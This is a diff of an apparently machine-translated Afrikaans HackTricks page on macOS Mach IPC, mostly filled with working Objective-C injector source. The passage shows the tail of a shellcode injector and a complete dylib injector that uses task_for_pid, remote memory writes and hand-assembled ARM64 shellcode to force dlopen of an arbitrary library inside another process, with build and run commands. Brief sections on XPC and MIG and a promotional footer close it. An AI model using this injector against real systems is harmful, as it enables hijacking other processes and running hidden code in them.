-return (0); }
+remoteStack64 += (STACK_SIZE / 2); // this is the real stack
+//remoteStack64 -= 8;  // need alignment of 16
 
-pid\_t pidForProcessName(NSString \*processName) { NSArray \*arguments = @\[@"pgrep", processName]; NSTask \*task = \[\[NSTask alloc] init]; \[task setLaunchPath:@"/usr/bin/env"]; \[task setArguments:arguments];
+const char* p = (const char*) remoteCode64;
 
-NSPipe \*pipe = \[NSPipe pipe]; \[task setStandardOutput:pipe];
+remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
+remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
+remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
+remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;
 
-NSFileHandle \*file = \[pipe fileHandleForReading];
+printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );
 
-\[task launch];
+kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
+(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );
 
-NSData \*data = \[file readDataToEndOfFile]; NSString \*string = \[\[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
+if (kr != KERN_SUCCESS) {
+fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
+return (-3);
+}
 
-return (pid\_t)\[string integerValue]; }
+return (0);
+}
 
-BOOL isStringNumeric(NSString _str) { NSCharacterSet_ nonNumbers = \[\[NSCharacterSet decimalDigitCharacterSet] invertedSet]; NSRange r = \[str rangeOfCharacterFromSet: nonNumbers]; return r.location == NSNotFound; }
+pid_t pidForProcessName(NSString *processName) {
+NSArray *arguments = @[@"pgrep", processName];
+NSTask *task = [[NSTask alloc] init];
+[task setLaunchPath:@"/usr/bin/env"];
+[task setArguments:arguments];
 
-int main(int argc, const char \* argv\[]) { @autoreleasepool { if (argc < 2) { NSLog(@"Usage: %s ", argv\[0]); return 1; }
+NSPipe *pipe = [NSPipe pipe];
+[task setStandardOutput:pipe];
 
-NSString \*arg = \[NSString stringWithUTF8String:argv\[1]]; pid\_t pid;
+NSFileHandle *file = [pipe fileHandleForReading];
 
-if (isStringNumeric(arg)) { pid = \[arg intValue]; } else { pid = pidForProcessName(arg); if (pid == 0) { NSLog(@"Error: Process named '%@' not found.", arg); return 1; } else{ printf("Found PID of process '%s': %d\n", \[arg UTF8String], pid); } }
+[task launch];
 
-inject(pid); }
+NSData *data = [file readDataToEndOfFile];
+NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
 
-return 0; }
+return (pid_t)[string integerValue];
+}
 
-````
+BOOL isStringNumeric(NSString *str) {
+NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
+NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
+return r.location == NSNotFound;
+}
+
+int main(int argc, const char * argv[]) {
+@autoreleasepool {
+if (argc < 2) {
+NSLog(@"Usage: %s <pid or process name>", argv[0]);
+return 1;
+}
+
+NSString *arg = [NSString stringWithUTF8String:argv[1]];
+pid_t pid;
+
+if (isStringNumeric(arg)) {
+pid = [arg intValue];
+} else {
+pid = pidForProcessName(arg);
+if (pid == 0) {
+NSLog(@"Error: Process named '%@' not found.", arg);
+return 1;
+}
+else{
+printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
+}
+}
+
+inject(pid);
+}
+
+return 0;
+}
+```
 </besonderhede>
 ```bash
 gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
 ./inject <pi or string>
-````
+```
+### Dylib Inspruiting in draad via Taakpoort
 
-#### Dylib Injeksie in draad via Taakpoort
+In macOS **drade** kan gemanipuleer word via **Mach** of deur die gebruik van **posix `pthread` api**. Die draad wat ons gegenereer het in die vorige inspuiting, is gegenereer met behulp van die Mach api, so **dit is nie posix voldoenend nie**.
 
-In macOS **drade** kan gemanipuleer word via **Mach** of deur die gebruik van **posix `pthread` api**. Die draad wat ons gegenereer het in die vorige injeksie, is gegenereer met behulp van die Mach api, so **dit is nie posix voldoenend nie**.
-
-Dit was moontlik om 'n eenvoudige shellkode in te spuit om 'n bevel uit te voer omdat dit **nie met posix voldoenende api's hoef te werk nie**, slegs met Mach. **Meer komplekse injeksies** sou die **draad** ook **posix voldoenend** moet wees.
+Dit was moontlik om 'n eenvoudige shellkode in te spuit om 'n bevel uit te voer omdat dit **nie met posix voldoenende api's hoef te werk nie**, slegs met Mach. **Meer komplekse inspuitings** sou die **draad** ook **posix voldoenend** moet wees.
 
 Daarom, om die draad te **verbeter**, behoort dit **`pthread_create_from_mach_thread`** te roep wat 'n geldige pthread sal skep. Dan kan hierdie nuwe pthread **dlopen** aanroep om 'n dylib van die stelsel te **laai**, sodat dit moontlik is om aangepaste biblioteke te laai in plaas daarvan om nuwe shellkode te skryf om verskillende aksies uit te voer.
 
-Jy kan **voorbeeld dylibs** vind (byvoorbeeld een wat 'n log genereer en dan kan jy daarna luister):
+Jy kan **voorbeeld dylibs** vind in (byvoorbeeld een wat 'n log genereer en dan kan jy daarna luister):
+
+{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
+[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert_libraries.md)
+{% endcontent-ref %}
+
+<details>
+
+<summary>dylib_injector.m</summary>
+```objectivec
+// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
+// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
+#include <dlfcn.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <mach/mach.h>
+#include <mach/error.h>
+#include <errno.h>
+#include <stdlib.h>
+#include <sys/sysctl.h>
+#include <sys/mman.h>
+
+#include <sys/stat.h>
+#include <pthread.h>
+
+
+#ifdef __arm64__
+//#include "mach/arm/thread_status.h"
+
+// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
+// And I say, bullshit.
+kern_return_t mach_vm_allocate
+(
+vm_map_t target,
+mach_vm_address_t *address,
+mach_vm_size_t size,
+int flags
+);
+
+kern_return_t mach_vm_write
+(
+vm_map_t target_task,
+mach_vm_address_t address,
+vm_offset_t data,
+mach_msg_type_number_t dataCnt
+);
+
+
+#else
+#include <mach/mach_vm.h>
+#endif
+
+
+#define STACK_SIZE 65536
+#define CODE_SIZE 128
+
+
+char injectedCode[] =
+
+// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)
+
+// Call pthread_set_self
+
+"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
+"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
+"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
+"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
+"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
+"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
+"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
+"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
+"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
+"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
+"\x00\x00\x00\x14" // loop: b loop              ; loop forever
+
+// Call dlopen with the path to the library
+"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
+"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
+"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
+"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
+"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()
+
+// Call pthread_exit
+"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
+"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
+"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit
+
+"PTHRDCRT"  // <-
+"PTHRDEXT"  // <-
+"DLOPEN__"  // <-
+"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
+"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
+"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
+"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
+"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
+"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;
+
+
+
+
+int inject(pid_t pid, const char *lib) {
+
+task_t remoteTask;
+struct stat buf;
+
+// Check if the library exists
+int rc = stat (lib, &buf);
+
+if (rc != 0)
+{
+fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
+//return (-9);
+}
+
+// Get access to the task port of the process we want to inject into
+kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
+if (kr != KERN_SUCCESS) {
+fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
+return (-1);
+}
+else{
+printf("Gathered privileges over the task port of process: %d\n", pid);
+}
+
+// Allocate memory for the stack
+mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
+mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
+kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
+
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
+return (-2);
+}
+else
+{
+
+fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
+}
+
+// Allocate memory for the code
+remoteCode64 = (vm_address_t) NULL;
+kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );
+
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
+return (-2);
+}
+
+
+// Patch shellcode
+
+int i = 0;
+char *possiblePatchLocation = (injectedCode );
+for (i = 0 ; i < 0x100; i++)
+{
+
+// Patching is crude, but works.
+//
+extern void *_pthread_set_self;
+possiblePatchLocation++;
+
+
+uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
+uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
+uint64_t addrOfDlopen = (uint64_t) dlopen;
+
+if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
+{
+memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
+printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
+}
+
+if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
+{
+memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
+printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
+}
+
+if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
+{
+printf ("DLOpen @%llx\n", addrOfDlopen);
+memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
+}
+
+if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
+{
+strcpy(possiblePatchLocation, lib );
+}
+}
+
+// Write the shellcode to the allocated memory
+kr = mach_vm_write(remoteTask,                   // Task port
+remoteCode64,                 // Virtual Address (Destination)
+(vm_address_t) injectedCode,  // Source
+0xa9);                       // Length of the source
+
+
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
+return (-3);
+}
+
+
+// Set the permissions on the allocated code memory
+```afrikaans
+kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
+
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Kan nie geheue-toestemmings instel vir kode van afgeleë draad nie: Fout %s\n", mach_error_string(kr));
+return (-4);
+}
+
+// Stel die toestemmings op die toegewysde stakingsgeheue
+kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
+
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Kan nie geheue-toestemmings instel vir stak van afgeleë draad nie: Fout %s\n", mach_error_string(kr));
+return (-4);
+}
+
+
+// Skep draad om shellkode uit te voer
+struct arm_unified_thread_state remoteThreadState64;
+thread_act_t         remoteThread;
+
+memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );
+
+remoteStack64 += (STACK_SIZE / 2); // dit is die werklike stak
+//remoteStack64 -= 8;  // nodig uitlyn van 16
+
+const char* p = (const char*) remoteCode64;
+
+remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
+remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
+remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
+remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;
+
+printf ("Afgeleë Stak 64  0x%llx, Afgeleë kode is %p\n", remoteStack64, p );
+
+kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
+(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );
+
+if (kr != KERN_SUCCESS) {
+fprintf(stderr,"Kan nie afgeleë draad skep nie: fout %s", mach_error_string (kr));
+return (-3);
+}
+
+return (0);
+}
+
+
+
+int main(int argc, const char * argv[])
+{
+if (argc < 3)
+{
+fprintf (stderr, "Gebruik: %s _pid_ _aksie_\n", argv[0]);
+fprintf (stderr, "   _aksie_: pad na 'n dylib op skyf\n");
+exit(0);
+}
+
+pid_t pid = atoi(argv[1]);
+const char *action = argv[2];
+struct stat buf;
+
+int rc = stat (action, &buf);
+if (rc == 0) inject(pid,action);
+else
+{
+fprintf(stderr,"Dylib nie gevind nie\n");
+}
+
+}
+```
+</besonderhede>
+```bash
+gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
+./inject <pid-of-mysleep> </path/to/lib.dylib>
+```
+### Draadkaping via Taakpoort <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>
+
+In hierdie tegniek word 'n draad van die proses gekaap:
+
+{% content-ref url="macos-thread-injection-via-task-port.md" %}
+[macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
+{% endcontent-ref %}
+
+## XPC
+
+### Basiese Inligting
+
+XPC, wat staan vir XNU (die kernel wat deur macOS gebruik word) interproseskommunikasie, is 'n raamwerk vir **kommunikasie tussen prosesse** op macOS en iOS. XPC bied 'n meganisme vir die maak van **veilige, asynchrone metode-oproepe tussen verskillende prosesse** op die stelsel. Dit is 'n deel van Apple se sekuriteitsparadigma, wat die **skepping van voorreg-geskeide toepassings** moontlik maak waar elke **komponent** met **slegs die regte wat dit nodig het** om sy werk te doen, hardloop, en sodoende die potensiële skade van 'n gekompromitteerde proses beperk.
+
+Vir meer inligting oor hoe hierdie **kommunikasie werk** en hoe dit **kwesbaar kan wees**, kyk:
+
+{% content-ref url="macos-xpc/" %}
+[macos-xpc](macos-xpc/)
+{% endcontent-ref %}
+
+## MIG - Mach Interface Generator
+
+MIG is geskep om die proses van Mach IPC-kode-skepping te **vereenvoudig**. Dit genereer basies die benodigde kode vir die bediener en kliënt om met 'n gegewe definisie te kommunikeer. Selfs al is die gegenereerde kode lelik, 'n ontwikkelaar hoef dit net in te voer en sy kode sal baie eenvoudiger wees as voorheen.
+
+Vir meer inligting, kyk:
+
+{% content-ref url="macos-mig-mach-interface-generator.md" %}
+[macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
+{% endcontent-ref %}
+
+## Verwysings
+
+* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
+* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
+* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
+* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
+* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
+
+<details>
+
+<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+
+Ander maniere om HackTricks te ondersteun:
+
+* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
+* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
+* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
 </details>
